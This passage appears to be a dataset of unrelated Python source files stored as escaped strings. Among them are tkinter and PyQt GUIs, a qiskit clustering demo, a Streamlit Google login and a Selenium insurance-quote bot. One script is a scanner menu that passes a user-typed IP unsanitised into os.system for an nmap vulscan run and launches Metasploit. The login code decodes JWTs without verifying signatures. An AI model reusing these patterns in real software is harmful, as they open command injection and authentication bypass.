{lunch_example}\\n\"\r\n    message += f\"\u0423\u0436\u0438\u043d: {dinner_example}\"\r\n\r\n    # Create a new window to display the menu\r\n    menu_window = tk.Toplevel(root)\r\n    menu_window.title(\"\u041c\u0435\u043d\u044e\")\r\n    menu_window.geometry(\"400x300\")\r\n\r\n    menu_label = tk.Label(menu_window, text=message)\r\n    menu_label.pack()\r\n\r\n    # Add a button to close the menu window\r\n    close_button = tk.Button(menu_window, text=\"\u0417\u0430\u043a\u0440\u044b\u0442\u044c\", command=menu_window.destroy)\r\n    close_button.pack()\r\n\r\nroot = tk.Tk()\r\nroot.geometry(\"800x600\")\r\nroot.resizable(True, True)\r\nroot.title(\"\u041a\u0430\u043b\u044c\u043a\u0443\u043b\u044f\u0442\u043e\u0440\")\r\nroot.configure(bg=BG_COLOR)\r\n\r\ntk.Label(root, text=\"\u0420\u043e\u0441\u0442 (\u0441\u043c):\", bg='white', fg=TEXT_COLOR).pack()\r\nentry_height = tk.Entry(root)\r\nentry_height.pack()\r\n\r\ntk.Label(root, text=\"\u0412\u0435\u0441 (\u043a\u0433):\", bg='blue', fg=TEXT_COLOR).pack()\r\nentry_weight = tk.Entry(root)\r\nentry_weight.pack()\r\n\r\ntk.Label(root, text=\"\u0412\u043e\u0437\u0440\u0430\u0441\u0442 (\u043b\u0435\u0442):\", bg='red', fg=TEXT_COLOR).pack()\r\nentry_age = tk.Entry(root)\r\nentry_age.pack()\r\n\r\nvar_activity = tk.StringVar(root)\r\nvar_activity.set(\"\u041d\u0438\u0437\u043a\u0430\u044f \u0430\u043a\u0442\u0438\u0432\u043d\u043e\u0441\u0442\u044c\")\r\n\r\ntk.Label(root, text=\"\u0423\u0440\u043e\u0432\u0435\u043d\u044c \u0430\u043a\u0442\u0438\u0432\u043d\u043e\u0441\u0442\u0438:\", bg=BG_COLOR, fg=TEXT_COLOR).pack()\r\nfor text, mode in activity_level.items():\r\n    tk.Radiobutton(root, text=text, variable=var_activity, value=text, bg=BG_COLOR, fg=TEXT_COLOR).pack()\r\n\r\ntk.Button(root, text=\"Calculate\", command=calculate_calories, bg=BUTTON_COLOR, fg='#000').pack()\r\n\r\nwelcome_window = tk.Toplevel(root)\r\nwelcome_window.title(\"\u041f\u0440\u0438\u0432\u0435\u0442\u0441\u0442\u0432\u0438\u0435\")\r\nwelcome_window.geometry(\"400x200\")\r\n\r\ntk.Label(welcome_window, text=\"\u0418\u043c\u044f: \", bg='white', fg=TEXT_COLOR).pack()\r\nname = tk.Entry(welcome_window)\r\nname.pack()\r\n\r\ndef next():\r\n    welcome_win2()\r\n    welcome_window.destroy()\r\n\r\nclose_button = tk.Button(welcome_window, text=\"\u041e\u041a\", command=next)\r\nclose_button.pack()\r\n\r\ndef welcome_win2():\r\n    welcome_window2 = tk.Toplevel(root)\r\n    welcome_window2.title(\"\u041f\u0440\u0438\u0432\u0435\u0442\u0441\u0442\u0432\u0438\u0435\")\r\n    welcome_window2.geometry(\"500x500\")\r\n\r\n    about_label = tk.Label(welcome_window2, text=\"\u041e \u043f\u0440\u043e\u0433\u0440\u0430\u043c\u043c\u0435\")\r\n    about_label.pack(pady=10)\r\n\r\n    hello_label = tk.Label(welcome_window2, text=\"\u041f\u0440\u0438\u0432\u0435\u0442,\"+name.get())\r\n    hello_label.pack(pady=10)\r\n\r\n    description_label = tk.Label(welcome_window2, text=\"\u041e\u043f\u0438\u0441\u0430\u043d\u0438\u0435 \u0441\u0430\u043c \u043f\u0438\u0448\u0438\")\r\n    description_label.pack(pady=10)\r\n\r\n    close_button2 = tk.Button(welcome_window2, text=\"\u041e\u041a\", command=welcome_window2.destroy)\r\n    clos",
    "from tkinter import *\n\njanelaA = Tk()\njanelaA.title(\"Quadrado1\")\njanelaA['bg'] = \"black\"\njanelaA.geometry(\"600x600\")\n\npontoR1 = LabelFrame(background=\"#ff0000\").place(x=200,y=200)\npontoR2 = LabelFrame(background=\"#ff0000\").place(x=200,y=400)\npontoB2 = LabelFrame(background=\"#0000ff\").place(x=400,y=200)\npontoB1 = LabelFrame(background=\"#0000ff\").place(x=400,y=400)\n\n\n\njanelaA.mainloop()\n\njanelaB = Tk()\njanelaB.title(\"Quadrado2\")\njanelaB['bg'] = \"black\"\njanelaB.geometry(\"600x600\")\n\npontoR1 = LabelFrame(background=\"#ff0000\").place(x=200,y=200)\npontoR2 = LabelFrame(background=\"#ff0000\").place(x=200,y=400)\npontoB2 = LabelFrame(background=\"#0000ff\").place(x=400,y=200)\npontoB1 = LabelFrame(background=\"#0000ff\").place(x=400,y=400)\n\n\nlinhaR = LabelFrame(width=1, height=200, bg=\"#ff0000\")\nlinhaR.pack()\nlinhaR.place(x=200,y=200)\n\nlinhaB = LabelFrame(width=1, height=200, bg=\"#0000ff\")\nlinhaB.pack()\nlinhaB.place(x=400,y=200)\n\njanelaB.mainloop()\n\njanelaC = Tk()\njanelaC.title(\"Quadrado2\")\njanelaC['bg'] = \"black\"\njanelaC.geometry(\"600x600\")\n\npontoR1 = LabelFrame(background=\"#ff0000\").place(x=200,y=200)\npontoR2 = LabelFrame(background=\"#ff0000\").place(x=200,y=400)\npontoB2 = LabelFrame(background=\"#0000ff\").place(x=400,y=200)\npontoB1 = LabelFrame(background=\"#0000ff\").place(x=400,y=400)\n\n\nlinhaR = LabelFrame(width=1, height=200, bg=\"#ff0000\")\nlinhaR.pack()\nlinhaR.place(x=200,y=200)\n\nlinhaB = LabelFrame(width=1, height=200, bg=\"#0000ff\")\nlinhaB.pack()\nlinhaB.place(x=400,y=200)\n\nlinhaBD1 = LabelFrame(width=200, height=1)\nlinhaBD1.S(\"red.Horizontal.TProgressbar\", foreground='red', background='red')\nlinhaBD1.pack()\nlinhaBD1.place(x=200,y=400)\n\njanelaC.mainloop()\n",
    "from qiskit import QuantumCircuit\nfrom qiskit.quantum_info import SparsePauliOp\nfrom qiskit.transpiler.preset_passmanagers import generate_preset_pass_manager\nfrom qiskit_ibm_runtime import QiskitRuntimeService, EstimatorV2 as Estimator\nfrom qiskit_machine_learning.datasets import ad_hoc_data\nimport matplotlib.pyplot as plt\nimport numpy as np\nfrom qiskit.circuit.library import ZZFeatureMap\nfrom qiskit.primitives import Sampler\nfrom qiskit_algorithms.state_fidelities import ComputeUncompute\nfrom qiskit_machine_learning.kernels import FidelityQuantumKernel\nfrom sklearn.cluster import SpectralClustering\nfrom sklearn.metrics import normalized_mutual_info_score\n\nadhoc_dimension = 12\ntrain_features, train_labels, test_features, test_labels, adhoc_total = ad_hoc_data(\n    training_size=25,\n    test_size=0,\n    n=adhoc_dimension,\n    gap=0.6,\n    plot_data=False,\n    one_hot=False,\n    include_sample_total=True,\n)\n\n\nplt.figure(figsize=(5, 5))\nplt.ylim(0, 2 * np.pi)\nplt.xlim(0, 2 * np.pi)\nplt.imshow(\n    np.asmatrix(adhoc_total).T,\n    interpolation=\"nearest\",\n    origin=\"lower\",\n    cmap=\"RdBu\",\n    extent=[0, 2 * np.pi, 0, 2 * np.pi],\n)\n\n\ndef plot_features(ax, features, labels, class_label, marker, face, edge, label):\n    # A train plot\n    ax.scatter(\n        # x coordinate of labels where class is class_label\n        features[np.where(labels[:] == class_label), 0],\n        # y coordinate of labels where class is class_label\n        features[np.where(labels[:] == class_label), 1],\n        marker=marker,\n        facecolors=face,\n        edgecolors=edge,\n        label=label,\n    )\n\n# A label plot\nplot_features(plt, train_features, train_labels, 0, \"s\", \"w\", \"b\", \"B\")\n\n# B label plot\nplot_features(plt, train_features, train_labels, 1, \"o\", \"w\", \"r\", \"B\")\n\nplt.legend(bbox_to_anchor=(1.05, 1), loc=\"upper left\", borderaxespad=0.0)\nplt.title(\"Ad hoc dataset for clustering\")\n\n# plt.show()\n\nadhoc_feature_map = ZZFeatureMap(feature_dimension=adhoc_dimension, reps=2, entanglement=\"linear\")\n\nadhoc_kernel = FidelityQuantumKernel(feature_map=adhoc_feature_map)\n\nadhoc_matrix = adhoc_kernel.evaluate(x_vec=train_features)\n\nplt.figure(figsize=(5, 5))\nplt.imshow(np.asmatrix(adhoc_matrix), interpolation=\"nearest\", origin=\"upper\", cmap=\"Greens\")\nplt.title(\"Ad hoc clustering kernel matrix\")\n# plt.show()\n\nadhoc_spectral = SpectralClustering(2, affinity=\"precomputed\")\n\ncluster_labels = adhoc_spectral.fit_predict(adhoc_matrix)\n\nprint(cluster_labels)\n\ncluster_score = normalized_mutual_info_score(cluster_labels, train_labels)\n\nprint(f\"Clustering score: {cluster_score}\")\n\n",
    "from PyQt5.QtCore import Qt\r\nfrom PyQt5.QtWidgets import (QListWidget,QLabel,QPushButton,QApplication,QVBoxLayout,QHBoxLayout,QWidget,QLineEdit,QTextEdit)\r\nimport json\r\n\r\napp = QApplication([])\r\n\r\ntext_field = QTextEdit()\r\ntext_field2 = QTextEdit()\r\n\r\ntext = QLabel('\u0421\u043f\u0438\u0441\u043e\u043a \u0437\u0430\u043c\u0435\u0442\u043e\u043a')\r\ntextiner = QListWidget()\r\ntxtt = QHBoxLayout()\r\nbtn = QPushButton('\u0423\u0434\u0430\u043b\u0438\u0442\u044c \u0437\u0430\u043c\u0435\u0442\u043a\u0443')\r\nbtn2 = QPushButton('\u0421\u043e\u0445\u0440\u0430\u043d\u0438\u0442\u044c \u0437\u0430\u043c\u0435\u0442\u043a\u0443')\r\nbtn3 = QPushButton('\u0421\u043e\u0437\u0434\u0430\u0442\u044c \u0437\u0430\u043c\u0435\u0442\u043a\u0443')\r\ntextiner2 = QListWidget()\r\nbtn4 = QPushButton('\u0414\u043e\u0431\u0430\u0432\u0438\u0442\u044c \u043a \u0437\u0430\u043c\u0435\u0442\u043a\u0435')\r\nbtn5 = QPushButton('\u041e\u0442\u043a\u0440\u0435\u043f\u0438\u0442\u044c \u043e\u0442 \u0437\u0430\u043c\u0435\u0442\u043a\u0438')\r\nbtn6 = QPushButton('\u0418\u0441\u043a\u0430\u0442\u044c \u0437\u0430\u043c\u0435\u0442\u043a\u0443 \u043f\u043e \u0442\u0435\u0433\u0443')\r\nteger = QLineEdit()\r\nteger.setPlaceholderText('\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u0442\u0435\u0433...')\r\n\r\nv1 = QVBoxLayout()\r\nv2 = QVBoxLayout()\r\nh1 = QHBoxLayout()\r\nh2 = QHBoxLayout()\r\n\r\nmain_h1 = QHBoxLayout()\r\nmain_h1.addWidget(text_field,stretch=7)\r\nmain_h1.addLayout(v2,stretch=5)\r\n\r\nv1.addWidget(text)\r\nv2.addWidget(textiner)\r\nv2.addLayout(h1)\r\nh1.addWidget(btn)\r\nh1.addWidget(btn2)\r\nv2.addWidget(btn3)\r\nv2.addWidget(textiner2)\r\nv2.addWidget(teger)\r\nv2.addLayout(h2)\r\nh2.addWidget(btn4)\r\nh2.addWidget(btn5)\r\nv2.addWidget(btn6)\r\n\r\nwindow = QWidget()\r\nwindow.resize(900,600)\r\nwindow.setLayout(main_h1)\r\n\r\nlist_tages = QListWidget()\r\n\r\nfield_tag = QLineEdit()\r\n\r\nmain_w1 = QVBoxLayout()\r\nmain_w1.addWidget(text_field2,stretch=8)\r\nmain_w1.addLayout(v2,stretch=6)\r\n\r\ndef delete_check():\r\n    pass\r\n\r\ndef save_check():\r\n    pass\r\n\r\ndef checker():\r\n    pass\r\n\r\ndef add_teg():\r\n    pass\r\n\r\ndef delete_teg():\r\n    pass\r\n\r\ndef find_teg():\r\n    pass\r\n\r\nbtn.clicked.connect(delete_check)\r\nbtn2.clicked.connect(save_check)\r\nbtn3.clicked.connect(checker)\r\nbtn4.clicked.connect(add_teg)\r\nbtn5.clicked.connect(delete_teg)\r\nbtn6.clicked.connect(find_teg)\r\n\r\nwindow.show()\r\napp.exec()",
    "# Installation du module python-nmap\r\n# pip install python-nmap\r\n\r\nimport nmap\r\nimport os\r\n\r\nsc = nmap.PortScanner()\r\n\r\nprint(\"\"\"\r\n__  _  _______  |  | __ ____   __| _/__  ______.__.\r\n\\ \\/ \\/ /\\__  \\ |  |/ // __ \\ / __ |\\  \\/  <   |  |\r\n \\     /  / __ \\|    <\\  ___// /_/ | >    < \\___  |\r\n  \\/\\_/  ____  /__|_ \\\\___  >____ |/__/\\_ \\/ ____|\r\n              \\/     \\/    \\/     \\/      \\/\\/     /\r\n\"\"\")\r\n\r\n\r\ndef main():\r\n    choice = input(\"1- Network scanner\\n2- Vulnerabilities detection\\n3- Exploit\\n\\nPlease enter a number: \")\r\n    \r\n    if choice == '1':\r\n        nmap_scan()\r\n        \r\n    elif choice == '2':\r\n        vuln()\r\n        \r\n    elif choice == '3':\r\n        os.system('msfconsole')\r\n        \r\n    else:\r\n        print('Please choose a number between 1 and 3')\r\n\r\n        \r\ndef nmap_scan():\r\n    print(\"******************** Welcome to the Network scanner ********************\")\r\n    print(\"**********************************************************************\")\r\n    ip = input(\"\\nPlease enter the IP address: \")\r\n    sc.scan(ip, '1-1024')\r\n    print(sc.scaninfo())\r\n    print(sc[ip]['tcp'].keys())\r\n    \r\n    \r\ndef vuln():\r\n    print(\"******************** Welcome to the Vulnerabilities scanner ********************\")\r\n    print(\"**********************************************************************\")\r\n    ip = input(\"\\nPlease enter the IP address: \")\r\n    os.system('nmap -sv --script=vulscan.nse ' + ip)\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()\r\n",
    "import re\r\nimport unittest\r\nimport datetime\r\nfrom util import (\r\n    set_month_range,\r\n    replace_date_with_hour,\r\n    check_phrases,\r\n    check_for_dolar_sign,\r\n)\r\n\r\n\r\nclass TestGenerateDateRange(unittest.TestCase):\r\n    def test_today_date_range(self):\r\n        start, end = set_month_range(1)\r\n        today = datetime.date.today()\r\n        expected_start = today.replace(day=1).strftime(\"%m/%d/%Y\")\r\n        expected_end = today.strftime(\"%m/%d/%Y\")\r\n        self.assertEqual(start, expected_start)\r\n        self.assertEqual(end, expected_end)\r\n\r\n    def test_one_month_ago_date_range(self):\r\n        start, end = set_month_range(2)\r\n        today = datetime.date.today()\r\n        expected_start = (\r\n            (today - datetime.timedelta(days=30)).replace(day=1).strftime(\"%m/%d/%Y\")\r\n        )\r\n        expected_end = today.strftime(\"%m/%d/%Y\")\r\n        self.assertEqual(start, expected_start)\r\n        self.assertEqual(end, expected_end)\r\n\r\n    def test_six_months_ago_date_range(self):\r\n        start, end = set_month_range(7)\r\n        today = datetime.date.today()\r\n        expected_start = (\r\n            (today - datetime.timedelta(days=180)).replace(day=1).strftime(\"%m/%d/%Y\")\r\n        )\r\n        expected_end = today.strftime(\"%m/%d/%Y\")\r\n        self.assertEqual(start, expected_start)\r\n        self.assertEqual(end, expected_end)\r\n\r\n    def test_check_phrases(self):\r\n        text_pattern = \"apple\"\r\n        text = \"I have an apple, he has an apple, we all have apples\"\r\n\r\n        # Test the function with a count of 0\r\n        count = 0\r\n        result = check_phrases(text_pattern, text, count)\r\n        self.assertEqual(result, 3)\r\n\r\n        # Test the function with a non-zero count\r\n        count = 2\r\n        result = check_phrases(text_pattern, text, count)\r\n        self.assertEqual(result, 5)\r\n\r\n        # Test the function with a different text pattern\r\n        text_pattern = \"banana\"\r\n        result = check_phrases(text_pattern, text, count)\r\n        self.assertEqual(result, 0)\r\n\r\n        # Test the function with an empty text string\r\n        text = \"\"\r\n        result = check_phrases(text_pattern, text, count)\r\n        self.assertEqual(result, 2)\r\n\r\n    def test_check_for_dollar_sign(self):\r\n        text = \"The price is $10.50\"\r\n        self.assertTrue(check_for_dolar_sign(text))\r\n\r\n        text = \"The price is 10 dollars\"\r\n        self.assertTrue(check_for_dolar_sign(text))\r\n\r\n        text = \"The price is 10.00 USD\"\r\n        self.assertTrue(check_for_dolar_sign(text))\r\n\r\n        text = \"The price is 10.50 CAD\"\r\n        self.assertFalse(check_for_dolar_sign(text))\r\n\r\n        text = \"The price is 10.50 euro\"\r\n        self.assertFalse(check_for_dolar_sign(text))\r\n\r\n        text = \"The price is ten dollars\"\r\n        self.assertFalse(check_for_dolar_sign(text))\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    unittest.main()\r\n",
    "\"\"\"Alias generators for converting between different capitalization conventions.\"\"\"\nimport re\n\n__all__ = ('to_pascal', 'to_camel', 'to_snake')\n\n\ndef to_pascal(snake: str) -> str:\n    \"\"\"Convert a snake_case string to PascalCase.\n\n    Args:\n        snake: The string to convert.\n\n    Returns:\n        The PascalCase string.\n    \"\"\"\n    camel = snake.title()\n    return re.sub('([0-9A-Za-z])_(?=[0-9A-Z])', lambda m: m.group(1), camel)\n\n\ndef to_camel(snake: str) -> str:\n    \"\"\"Convert a snake_case string to camelCase.\n\n    Args:\n        snake: The string to convert.\n\n    Returns:\n        The converted camelCase string.\n    \"\"\"\n    camel = to_pascal(snake)\n    return re.sub('(^_*[A-Z])', lambda m: m.group(1).lower(), camel)\n\n\ndef to_snake(camel: str) -> str:\n    \"\"\"Convert a PascalCase or camelCase string to snake_case.\n\n    Args:\n        camel: The string to convert.\n\n    Returns:\n        The converted string in snake_case.\n    \"\"\"\n    snake = re.sub(r'([a-zA-Z])([0-9])', lambda m: f'{m.group(1)}_{m.group(2)}', camel)\n    snake = re.sub(r'([a-z0-9])([A-Z])', lambda m: f'{m.group(1)}_{m.group(2)}', snake)\n    return snake.lower()\n",
    "import streamlit as st\nimport firebase_admin\nfrom firebase_admin import auth, exceptions, credentials, initialize_app\nimport asyncio\nfrom httpx_oauth.clients.google import GoogleOAuth2\nimport webbrowser\nfrom src.main import global_state\nfrom firebase_admin import firestore\n\nimport asyncio\nfrom typing import Optional\nimport streamlit.components.v1 as components\nimport jwt\nimport streamlit as st\nfrom httpx_oauth.clients.google import GoogleOAuth2\nfrom httpx_oauth.oauth2 import OAuth2Token\n\nfrom firebase_admin import credentials, initialize_app, storage\nfrom streamlit.components.v1 import html\nfrom datetime import datetime, timedelta\nimport base64\n\n# cred = credentials.Certificate(\"streamlitchat-a40f7-8c5fd38d36bf.json\")\n# try:\n#     firebase_admin.get_app()\n# except ValueError as e:\n#     initialize_app(cred)\n\n# Initialize Google OAuth2 client\nclient_id = st.secrets[\"client_id\"]\nclient_secret = st.secrets[\"client_secret\"]\nredirect_url = st.secrets['redirect_url']  # Your redirect URL\n\nclient = GoogleOAuth2(client_id=client_id, client_secret=client_secret)\n\n\ndef app(global_state,inner_call=False):\n\n\n\n\n    def decode_user(token: str):\n        \"\"\"\n        :param token: jwt token\n        :return:\n        \"\"\"\n        decoded_data = jwt.decode(jwt=token, options={\"verify_signature\": False})\n        return decoded_data\n\n\n    async def get_authorization_url(client: GoogleOAuth2, redirect_url: str) -> str:\n        authorization_url = await client.get_authorization_url(\n            redirect_url,\n            scope=[\"email\"],\n            extras_params={\"access_type\": \"offline\"},\n        )\n\n        return authorization_url\n\n\n    def markdown_button(\n        url: str, text: Optional[str] = None, color=\"#FD504D\", sidebar: bool = True\n    ):\n        markdown = st.sidebar.markdown if sidebar else st.markdown\n\n        markdown(\n            f\"\"\"\n        <a href=\"{url}\" target=\"_blank\">\n            <div style=\"\n                display: inline-flex;\n                -webkit-box-align: center;\n                align-items: center;\n                -webkit-box-pack: center;\n                justify-content: center;\n                font-weight: 400;\n                padding: 0.25rem 0.75rem;\n                border-radius: 0.25rem;\n                margin: 0px;\n                margin-bottom: 2px;\n                line-height: 1.6;\n                width: auto;\n                user-select: none;\n                background-color: {color};\n                color: rgb(255, 255, 255);\n                border: 1px solid rgb(255, 75, 75);\n                text-decoration: none;\n                \">\n                {text}\n            </div>\n        </a>\n        \"\"\",\n            unsafe_allow_html=True,\n        )\n\n\n    async def get_access_token(\n        client: GoogleOAuth2, redirect_url: str, code: str\n    ) -> OAuth2Token:\n        token = await client.get_access_token(code, redirect_url)\n\n        return token\n\n\n    def get_access_token_from_query_params(\n        client: GoogleOAuth2, redirect_url: str\n    ) -> OAuth2Token:\n        query_params = st.experimental_get_query_params()\n        code = query_params[\"code\"][0]\n        token = asyncio.run(\n            get_access_token(client=client, redirect_url=redirect_url, code=code)\n        )\n\n        # Clear query params\n        st.experimental_set_query_params()\n        print('token')\n        return token\n\n\n    def show_login_button(\n        text: Optional[str] = \"Login with Google\", color=\"#FD504D\", sidebar: bool = True\n    ):\n        authorization_url = asyncio.run(\n            get_authorization_url(client=client, redirect_url=redirect_url)\n        )\n        if not global_state.email:\n            markdown_button(authorization_url, text, color, sidebar)\n            get_logged_in_user_email()\n        # markdown_button(authorization_url, text, color, sidebar)\n        # get_logged_in_user_email()\n\n\n    def get_logged_in_user_email():\n        try:\n            token_from_params = get_access_token_from_query_params(client, redirect_url)\n            print('t',token_from_params)\n        except Exception as e:\n            print(e)\n            return None\n\n\n        user_info = decode_user(token=token_from_params[\"id_token\"])\n        print(user_info)\n        global_state.email = user_info[\"email\"]\n        print(global_state.email)\n        # Check if the user exists in Firebase Authentication\n        user = get_or_create_firebase_user(global_state.email)\n        st.rerun()\n\n        # global_state.email = user.email\n\n        # global_state.set_email(user.email)\n\n        # # Store user session after successful login\n        # # store_user_session()\n\n        # st.markdown(\"\")\n\n        # return user.email\n\n    \n    def get_or_create_firebase_user(email: str):\n        try:\n            # Attempt to get the user by email\n            user = auth.get_user_by_email(email)\n            return user\n        except exceptions.FirebaseError as e:\n            user = auth.create_user(email=email)\n            return user\n            \n\n\n",
    "import time\nimport random\nimport os\nimport platform\n\n\"\"\"\nProgramer Notes\n- created in a way to enable a outside user to add more alleles if they wanted.\n- clearly labeled survival and mutation chances to further customize simulation environment\n- added support for 3 operating systems. this does not mean one \".exe\" file will work on all 3. the program would need to be \n\"\"\"\n\n\n# Logic\n\n# Class\nclass Rabbit:\n    def __init__(self, allele):\n        self.allele = allele\n        \n        \n# Functions        \ndef generate_starting_rabbit_count(num_rabbits):\n    population = [] # save location for starting number of rabbits\n    for i in range(num_rabbits): # loop to assign random allele to preselected number of rabbits\n        allele = random.choice([\"WW\", \"Ww\", \"ww\"])\n        rabbit = Rabbit(allele)\n        population.append(rabbit)\n    return population # returns a number of rabbits and their starting alleles\n\ndef count_alleles(population):\n    allele_counts = {\"WW\": 0, \"Ww\": 0, \"ww\": 0} # will display out on the screen the total number of rabbits\n    for rabbit in population:\n        allele_counts[rabbit.allele] += 1\n    return allele_counts\n\ndef simulate_generation(population):\n    # Select rabbits to remove (simulate death)\n    surviving_rabbits = []\n    has_WW = any(rabbit.allele == \"WW\" for rabbit in population)\n    has_Ww = any(rabbit.allele == \"Ww\" for rabbit in population)\n    has_ww = any(rabbit.allele == \"ww\" for rabbit in population)\n\n    for rabbit in population:\n        # survival rates\n        if rabbit.allele == \"Ww\": # This next line lowers the survival chance of just \"Ww\" rabbits as during testing, they seemed to explode in poulation\n            if random.random() < 0.3:  # chance of survival for \"Ww\" rabbits\n                surviving_rabbits.append(rabbit)\n        else:\n            if random.random() < 0.4:  # 40% chance of survival for all other rabbits\n                surviving_rabbits.append(rabbit)\n\n    # Ensure at least two rabbits remain alive, prevents program from creating new rabbits if all had died\n    while len(surviving_rabbits) < 2:\n        new_rabbit_allele = random.choice([\"WW\", \"Ww\", \"ww\"])\n        if new_rabbit_allele == \"WW\" and not has_WW:\n            surviving_rabbits.append(Rabbit(new_rabbit_allele))\n            has_WW = True\n        elif new_rabbit_allele == \"ww\" and not has_ww:\n            surviving_rabbits.append(Rabbit(new_rabbit_allele))\n            has_ww = True\n        elif new_rabbit_allele == \"Ww\" and not has_Ww:\n            surviving_rabbits.append(Rabbit(new_rabbit_allele))\n            has_Ww = True\n\n    # Reproduce and create offspring with a limit, this was implemented as the population seemed to explode exponentially anytime it got bigger than 30\n    offspring_limit = 50  # Limit can be adjusted here\n    offspring = []\n    for _ in range(min(len(surviving_rabbits) * 3, offspring_limit)):\n        parent = random.choice(surviving_rabbits)\n        # Introduce mutation with a small probability\n        if random.random() < 0.07:  # chance of mutation\n            offspring_allele = random.choice([\"WW\", \"Ww\", \"ww\"]) # adds random alleles back into the population to increase perceived randomness\n        else:\n            offspring_allele = random.choice([parent.allele, parent.allele])\n        offspring.append(Rabbit(offspring_allele))\n\n    return offspring\n\n\n\ndef create_results_file():\n    # Create a random number for the file name\n    random_number = random.randint(1, 1000)\n    \n    # Determine the path to the \"Downloads\" directory based on the operating system\n    if platform.system() == \"Windows\":\n        downloads_dir = os.path.join(os.path.expanduser(\"~\"), \"Downloads\")\n    elif platform.system() == \"Darwin\":  # macOS\n        downloads_dir = os.path.join(os.path.expanduser(\"~\"), \"Downloads\")\n    elif platform.system() == \"Linux\":  # Linux\n        downloads_dir = os.path.join(os.path.expanduser(\"~\"), \"Downloads\")\n    else:\n        print(\"Unsupported operating system.\")\n        return\n\n    # Create the file path\n    file_name = f\"rabbit_simulation_{random_number}.csv\"\n    file_path = os.path.join(downloads_dir, file_name)\n\n    # Create the file\n    with open(file_path, \"w\") as file:\n        file.write(\"Generation,WW,Ww,ww\\n\")\n\n    return file_path\n\ndef define_rules():\n    print(\"Phases: \\n 1. When prompted, enter the starting number of Rabbits.\\n 2. The program will display the mix of alleles your rabbits have\\n 3. Everytime you hit enter, 3 copies of the Rabbits will be made from the previous generation. then they will all have a coin flipped to see if they perish.\\n 4. The program repeats from phase 2 at this point.\\n 5. A \\\".csv\\\" file will be created in your \\\"Downloads\\\" folder. The results of your experiments will be saved there.\\n The naming schema will be the addition of a random number from 1-1000 appeneded a file named \\\"bunny_simulation...\\\".\")\n\n\n\n# Program entry point\ndef main():\n    define_rules()\n    # \"try\" blocks will test input for bad data. if someon",
    "from selenium import webdriver\r\nfrom selenium.webdriver.common.keys import Keys\r\nfrom selenium.webdriver.common.by import By\r\nfrom selenium.webdriver.support.ui import Select\r\nfrom selenium.common.exceptions import NoSuchElementException\r\nfrom flask import Flask, render_template, request\r\nimport time\r\n\r\napp = Flask(__name__)\r\n\r\ndef insurance_calculator(input_data_regNo, input_data_Usrttl, input_data_dobD, input_data_dobM, input_data_dobY, input_data_eircd, input_data_ptdm, input_data_ptdy):\r\n\r\n  \r\n\r\n  # Initialize the web driver\r\n  #driver = webdriver.Chrome()\r\n  driver = webdriver.Firefox()\r\n\r\n  # Navigate to the webpage\r\n  driver.get(\"https://motor.axa.ie/supervalu/quote-v2/your-details/\")\r\n  time.sleep(2)          \r\n\r\n  # Removes Cookies pop-up\r\n  field_wrapper = driver.find_element(By.ID, \"_evidon_banner\")\r\n  button_input = field_wrapper.find_element(By.CLASS_NAME, \"evidon-banner-declinebutton\")\r\n  button_input.click()\r\n\r\n  # Find the form field with the ID \"reg\"\r\n  reg_field = driver.find_element(By.ID, \"VehicleDetails.VehicleRegistrationNumber\")\r\n\r\n  # Interact with the form fields as needed\r\n  reg_field.send_keys(input_data_regNo)\r\n  reg_field.send_keys(Keys.RETURN)\r\n  time.sleep(5)\r\n\r\n  # Find the form field with the NAME \"correct_car\"\r\n  button_input = driver.find_element(By.XPATH, \"//label[@for='VehicleDetails.ConfirmCarSearchBtn1']\")\r\n  button_input.click()\r\n\r\n  # Find the form field with the NAME \"business_purposes\"\r\n  # Business purposes\r\n  button_input = driver.find_element(By.XPATH, \"//label[@for='VehicleDetails.IsVehicleForBusinessUse2']\")\r\n  button_input.click()\r\n  # Business purposes 2\r\n  button_input = driver.find_element(By.XPATH, \"//label[@for='VehicleDetails.IsVehicleForCommutingUse2']\")\r\n  button_input.click()\r\n\r\n  # Kilometres per year\r\n  select_element = Select(driver.find_element(By.ID, \"VehicleDetails.AnnualDistanceDrivenTypeId\"))\r\n  select_element.select_by_value(\"10227001\")\r\n\r\n  # Personal Details\r\n  # User's title\r\n  if input_data_Usrttl == \"10106001\":\r\n    button_input = driver.find_element(By.XPATH, '//label[@for=\"ProposerDetails.TitleTypeId1\"]')\r\n  elif input_data_Usrttl == \"10106002\":\r\n    button_input = driver.find_element(By.XPATH, '//label[@for=\"ProposerDetails.TitleTypeId2\"]')\r\n  button_input.click()\r\n  # First name\r\n  text_input = driver.find_element(By.NAME, \"ProposerDetails.FirstName\")\r\n  text_input.click()\r\n  text_input.clear()\r\n  text_input.send_keys(\"Alex\")\r\n  # Last name\r\n  text_input = driver.find_element(By.NAME, \"ProposerDetails.LastName\")\r\n  text_input.click()\r\n  text_input.clear()\r\n  text_input.send_keys(\"Murphy\")\r\n  # DOB Day\r\n  tel_input = driver.find_element(By.NAME, \"ProposerDetails.DateOfBirth.Day\")\r\n  tel_input.click()\r\n  tel_input.clear()\r\n  tel_input.send_keys(input_data_dobD)\r\n  # DOB Month\r\n  tel_input = driver.find_element(By.NAME, \"ProposerDetails.DateOfBirth.Month\")\r\n  tel_input.click()\r\n  tel_input.clear()\r\n  tel_input.send_keys(input_data_dobM)\r\n  # DOB Year\r\n  tel_input = driver.find_element(By.NAME, \"ProposerDetails.DateOfBirth.Year\")\r\n  tel_input.click()\r\n  tel_input.clear()\r\n  tel_input.send_keys(input_data_dobY)\r\n  # Email address\r\n  text_input = driver.find_element(By.NAME, \"ProposerDetails.EmailAddress\")\r\n  text_input.click()\r\n  text_input.clear()\r\n  text_input.send_keys(\"carinsurancedummy@gmail.com\")\r\n  # Phone number\r\n  tel_input = driver.find_element(By.NAME, \"phone-number\")\r\n  tel_input.click()\r\n  tel_input.clear()\r\n  tel_input.send_keys(\"1231231231\")\r\n  # Status\r\n  button_input = driver.find_element(By.XPATH, \"//label[@for='ProposerDetails.EmploymentStatusTypeId6']\")\r\n  button_input.click()\r\n  # Part-time occupation\r\n  time.sleep(1)\r\n  button_input = driver.find_element(By.XPATH, \"//label[@for='ProposerDetails.PartTimeOccupation2']\")\r\n  button_input.click()\r\n  #Eircode\r\n  text_input = driver.find_element(By.NAME, \"ProposerDetails.AddressDisplayFormatted\")\r\n  text_input.click()\r\n  text_input.clear()\r\n  text_input.send_keys(input_data_eircd)\r\n  # Select Eircode\r\n  time.sleep(1)\r\n  button_input = 